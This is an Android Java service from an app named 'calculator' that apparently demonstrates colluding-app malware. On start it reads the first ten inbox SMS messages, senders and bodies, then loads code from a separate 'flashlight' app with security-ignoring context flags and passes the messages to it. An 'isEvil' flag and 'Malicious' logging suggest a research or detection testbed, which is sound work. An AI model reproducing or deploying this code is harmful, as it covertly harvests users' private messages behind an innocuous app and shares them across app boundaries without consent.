package com.example.calculator;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.lang.reflect.Constructor;
import java.util.HashMap;

import static android.content.ContentValues.TAG;

public class BackgroundService extends Service {

    private boolean isRunning;
    private Context context;
    private Handler handler;
    HashMap<String, String> smsList = new HashMap<String, String>();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        this.isRunning = false;

    }

    private Runnable myTask = new Runnable() {

        public void run() {
            try {
                new ForegroundCheckTask().execute();
                Log.e(TAG, "fromService");
                stopSelf();
            } catch (Exception ex) {
                Log.e(TAG, ex.toString());
            }
        }

    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MainActivity.isEvil = true;
        Clues myclues = new Clues();
        myclues.SendLog("App Mode Change", "App entered onStartCommand()", "Malicious");

        if (!this.isRunning) {
            this.isRunning = true;
            handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }

    class ForegroundCheckTask extends AsyncTask<String[], Void, String> {
        String[] result;

        @Override
        protected String doInBackground(String[]... params) {
            getSMSDetails(result);
            return "";
        }

        private Boolean getSMSDetails(final String[] param) {
            Cursor smsCursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null,
                    null,
                    null,
                    null);

            try {
                int i = 0;
                while (smsCursor.moveToNext()) {
                    String sender = smsCursor.getString(smsCursor.getColumnIndexOrThrow("address"));
                    String message = smsCursor.getString(smsCursor.getColumnIndexOrThrow("body"));
                    smsList.put(sender, message);
                    i++;
                    if (i == 10) {
                        break;
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            } finally {
                smsCursor.close();
            }

            try {
                PackageManager packageManager = getPackageManager();
                try {
                    packageManager.getPackageInfo("com.example.flashlight", PackageManager.GET_ACTIVITIES);
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlight",
                        Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);

                final ClassLoader loader = remoteContext.getClassLoader();
                final Class cls = loader.loadClass("com.example.flashlight.BackgroundService");
                final Class clsnotify = loader.loadClass("com.example.flashlight.NotificationActivity");

                final Constructor constructor = cls.getConstructor();
                final Constructor constructor1 = clsnotify.getConstructor();
                Handler h = new Handler(Looper.getMainLooper());
                h.post(new Runnable() {
                    public void run() {
                        try {
                            Intent intent1 = new Intent(remoteContext, clsnotify);
                            intent1.putExtra("SMS_LIST", smsList);
                            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                            remoteContext.startActivity(intent1);

                            Service obj = Service.class.cast(constructor.newInstance());

                            Intent intent = new Intent(remoteContext, obj.getClass());

                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                });
            } catch (Exception ex) {
                Log.e("I DONT KNOW", ex.toString());
                ex.printStackTrace();
            }

            stopSelf();

            return true;
        }
    }
}
